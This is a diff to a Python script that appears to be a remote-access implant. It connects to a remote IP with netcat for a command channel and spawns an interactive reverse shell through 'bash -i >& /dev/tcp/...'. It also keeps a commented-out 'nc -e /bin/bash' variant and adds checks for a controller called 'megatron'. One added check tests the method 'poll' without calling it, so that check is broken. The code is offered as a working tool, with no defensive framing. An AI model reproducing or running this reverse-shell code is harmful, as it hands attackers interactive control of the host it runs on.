@@ -15,17 +15,17 @@ CMD_END_FILE = '-t'
 
 def main():
     print('Initialising main coms')
-    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                    stderr=subprocess.PIPE, universal_newlines=True)
+    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
     print('Initialising remote shell')
     # process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-    process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True,
-                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                     universal_newlines=True)
-    # if process_main.poll() is not None and process_shell.poll() is not None:
-    #    print('Initialisation Successful')
-    # else:
-    #    raise Exception('Error 102 during initialisation - is megatron running?')
+    process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+
+    if process_main.poll is None:
+        raise Exception('Error 102 during main_coms initialisation - is megatron running?')
+    if process_shell.poll() is not None:
+        print('Initialisation Successful')
+    else:
+        print('Megatron running, but shell appears faulty - reverse shell command is bad?')
 
     while True:
         command = process_main.stdout.readline().rstrip()
